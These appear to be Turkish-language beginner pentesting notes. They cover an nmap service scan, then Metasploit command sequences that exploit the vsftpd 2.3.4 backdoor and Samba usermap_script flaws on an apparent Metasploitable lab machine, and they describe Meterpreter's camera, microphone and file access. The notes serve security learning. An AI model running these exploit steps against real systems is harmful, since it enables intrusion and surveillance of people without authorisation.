Nmap, hedef cihazdaki kullanılan sevisleri vb. tarar ve bunlarda bir açık olabilir mi veya hangi sürümleri kullanıyor bunları söyler.
https://www.stationx.net/nmap-cheat-sheet/ -> nmap kodlarını araştırmak için

nmap -v -sS -A -T4 hedefIP -> hedef sunucu veya cihazın ip'sinde tarama yapar ve açık portları, kullanılan servisleri ve sistem sürümlerini
tarar. -v tüm ayrıntıları yazar, -A işletim sistemini tarar ve kullanılan sürümleri yazar, -sS portları tarar, -T4 taramanın hangi hızda
olacağını belirtir.

Hacklemeye giriş:

msfconsole -> metasploit framework'üne giriş yapar. bu framework'ün içinde ftp,ssh gibi servislerin açıklarını sömürmek için program
yazmaya gerektirmeden direkt kısa komutlarla sömürmemize yardımcı oluyor. örneğin saldırı yapacağımızı sunucunun kullandığı servisleri
nmap ile öğrendikten o servisin sürümünü internette aratarak açık var mı diye bakabiliriz. rapid7 sayfasında bu açıkların msfc için
kısa komutları oluyor. Aşağıdaki kod ftp servisinin 2.3.4 sürümündeki açığı uzun kodlar yazmadan sömürmemizi sağlıyor. sunucunun ip
adresini verdikten sonra o sunucuya bu kodları çalıştırarak giriş yapıyor

use exploit/unix/ftp/vsftpd_234_backdoor -> makinemizin kullandığı ftp servisinin sürümündeki açığı kullanmamızı sağlar.

show options -> modüle girdikten sonra ayarlar kısmına giriyoruz ve burada rhosts ve rport kısımları var rhosts hangi IP'nin 21. portuna
gideceğim(rpost) anlamına geliyor. en alttaki exploit target'taki automatic ise rhosts'u otomatikk seçer

set rhosts hedefIP -> burada saldırı yapacağımız sunucunun IP adresini ekliyoruz.

exploit -j -z ->  saldırıyı başlatır. ama sisteme giriş yapmaz sadece sisteme bağlanacak yolu ayarlar

sessions -l -> sisteme bağlanmak için açılan yolları gösterir

sessions id -> yolu aktif hale getirir sisteme girer. sisteme girdiğimizi uname -a ile sistemin adını öğrenebiliriz

background -> hack'lenilen sistemden çıkar

Samba Servisinden Hackleme:

use exploit/multi/samba/usermap_script -> metasploitable makinemizin samba sürümünde bir açık olduğunu bulduk ve modül ile bu açığı
kullandık.

set rhosts hedefIP -> modülün hangi cihaz üzerinde kullanılacağını belirtiyoruz.

Meterpreter:

Sunucuların kullandığı servislerdeki açıklarda bazen meterpreter erişimi olabilir. Bu erişim saldırı yapılan sunucuda birçok komut çalıştırma
olanağı tanır. Örneğin mikrofona, kameraya erişim, kendi pc'mizden dosya aktarımı, sunucuda dosyalar oluşturma, silme ve okuma gibi birçok
işlem gerçekleştirme olanağı tanır.